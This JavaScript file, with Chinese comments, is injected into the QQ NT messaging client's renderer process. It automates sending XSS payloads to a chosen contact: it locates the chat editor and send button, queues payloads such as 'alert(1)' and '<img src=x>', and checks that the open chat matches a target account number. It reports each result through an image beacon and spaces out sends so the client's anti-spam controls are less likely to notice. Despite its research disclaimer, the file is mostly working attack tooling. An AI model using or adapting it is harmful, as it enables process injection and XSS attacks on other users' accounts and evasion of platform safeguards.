/*
 * inject_send_payload.js
 * ---------------------------------------------------------------
 * 通过 TzdInjectorNTQQ.injectRendererProcess() 注入到 QQ NT 渲染进程后执行。
 * 作用：在页面上下文里定位聊天输入框（Chromium DOM，无 Win32 HWND），
 *       把 XSS payload 设为输入值、派发 input 事件、触发发送。
 *
 * 完全不依赖 --remote-debugging-port / CDP / 窗口句柄 / 键盘焦点。
 *
 * 用法（在注入器侧）：
 *   Injector.injectRendererProcess("QQ.exe",
 *     readFileSync('inject_send_payload.js','utf8') +
 *     "\n;window.__xssRun('alert(1)');" );
 *
 * 免责：仅用于安全研究 / XSS 输入处理逻辑测试，须确保对 QQ 的使用已获授权。
 * ---------------------------------------------------------------
 */

(function () {
  'use strict';

  // 候选输入框选择器（QQ NT 不同版本的编辑器差异，做多路兜底）
  const EDITOR_SELECTORS = [
    'div[contenteditable="true"]',            // 现代 contenteditable 编辑器
    'div.editor-content[contenteditable]',
    '.ml-editor[contenteditable="true"]',
    'textarea',                              // 旧版 textarea
    '#editor', '[data-testid="editor"]'
  ];

  // 候选发送按钮选择器
  const SEND_SELECTORS = [
    'button[data-name="send"]',
    'button.send-button',
    '.ml-send-button',
    'div[role="button"][aria-label*="发送"]',
    'div.titlebar-button.send'
  ];

  function findEditor() {
    for (const sel of EDITOR_SELECTORS) {
      const el = document.querySelector(sel);
      if (el && (el.offsetParent !== null || el === document.activeElement)) return el;
    }
    // 兜底：当前聚焦的可编辑元素
    if (document.activeElement &&
        (document.activeElement.isContentEditable ||
         document.activeElement.tagName === 'TEXTAREA')) {
      return document.activeElement;
    }
    return null;
  }

  function findSendButton() {
    for (const sel of SEND_SELECTORS) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    // 兜底：遍历按钮，文本含"发送"
    const btns = Array.from(document.querySelectorAll('button,div[role="button"]'));
    return btns.find(b => /发送|send/i.test(b.textContent || b.innerText || '')) || null;
  }

  // 把文本写进编辑器并通知 QQ 的响应式框架（关键：必须派发 input 事件）
  function setEditorValue(editor, text) {
    if (!editor) return false;
    editor.focus();

    if (editor.tagName === 'TEXTAREA' || editor.tagName === 'INPUT') {
      const setter = Object.getOwnPropertyDescriptor(
        window.HTMLTextAreaElement.prototype, 'value').set;
      setter.call(editor, text);
    } else {
      // contenteditable：以纯文本节点写入（XSS 测试要的是字面字符串被 QQ 当文本处理）
      editor.textContent = text;
    }

    // 让 Vue/React 的 v-model / 受控组件感知到变化
    editor.dispatchEvent(new Event('input',  { bubbles: true }));
    editor.dispatchEvent(new Event('change', { bubbles: true }));
    editor.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'Process' }));
    return true;
  }

  function clickSend(btn) {
    if (!btn) return false;
    btn.focus();
    btn.click();
    // 某些版本需要派发 mousedown/up 才触发
    btn.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
    btn.dispatchEvent(new MouseEvent('mouseup',   { bubbles: true }));
    btn.dispatchEvent(new MouseEvent('click',     { bubbles: true }));
    return true;
  }

  // 结果回传：若驱动壳设置了 window.__xssBeacon（driver 内置 HTTP 服务的地址），
  // 则把每条结果 beacong 回去；未设置则静默（不影响发送行为）。
  window.__xssBeacon = window.__xssBeacon || null;
  // 目标账号守卫：驱动壳可设置 window.__xssTargetUin（如 "2046563589"）。
  // 设置后，发送前会扫描页面可见文本，确认当前打开的聊天对象包含该 UIN，
  // 避免把消息发到错误的窗口。
  window.__xssTargetUin = window.__xssTargetUin || null;

  function report(text, result) {
    if (!window.__xssBeacon) return;
    try {
      const u = window.__xssBeacon +
        '?p=' + encodeURIComponent(String(text).slice(0, 200)) +
        '&r=' + encodeURIComponent(JSON.stringify(result));
      new Image().src = u; // 经典像素 beacon，CSP 不拦则生效；拦了也不报错
    } catch (e) { /* 忽略 */ }
  }

  // 目标账号校验（best-effort）：扫描 document.body 可见文本，命中目标 UIN 即视为"已确认在当前聊天"。
  // 未命中不代表错（可能用昵称而非数字 UIN 显示），此时仍发送但 result 标记 unverified。
  function verifyChat() {
    if (!window.__xssTargetUin) return { ok: true, verified: false };
    const needle = String(window.__xssTargetUin);
    const hay = (document.body && document.body.innerText) ? document.body.innerText : '';
    if (hay.indexOf(needle) >= 0) return { ok: true, verified: true };
    return { ok: true, verified: false, unverified: true };
  }

  // 单条发送
  window.__xssSend = function (text) {
    const v = verifyChat();
    if (!v.ok) { const r = { ok: false, reason: 'verify-fail' }; report(text, r); return Promise.resolve(r); }
    const editor = findEditor();
    if (!editor) { const r = { ok: false, reason: 'no-editor', verified: v.verified, unverified: v.unverified }; report(text, r); return Promise.resolve(r); }
    const okSet = setEditorValue(editor, text);
    if (!okSet) { const r = { ok: false, reason: 'set-fail', verified: v.verified, unverified: v.unverified }; report(text, r); return Promise.resolve(r); }
    // 给框架一点时间消化 input 事件
    return new Promise((resolve) => {
      setTimeout(() => {
        const btn = findSendButton();
        const okClick = clickSend(btn);
        const r = { ok: okClick, reason: okClick ? 'sent' : 'no-send-btn', verified: v.verified, unverified: v.unverified };
        report(text, r);
        resolve(r);
      }, 120);
    });
  };

  // 批量队列：window.__xssQueue = ['<img src=x>', ...]; window.__xssRun();
  window.__xssQueue = window.__xssQueue || [];
  let __running = false;

  window.__xssRun = async function (single) {
    if (single !== undefined) window.__xssQueue.push(single);
    if (__running) return 'already-running';
    __running = true;
    const results = [];
    while (window.__xssQueue.length) {
      const p = window.__xssQueue.shift();
      const r = await window.__xssSend(p);
      results.push({ payload: p, result: r });
      console.log('[xss]', JSON.stringify({ payload: p, result: r }));
      await new Promise(res => setTimeout(res, 800)); // 发送间隔，避免刷屏/风控
    }
    __running = false;
    return results;
  };

  console.log('[xss] payload injector ready. use window.__xssRun("alert(1)")');
})();
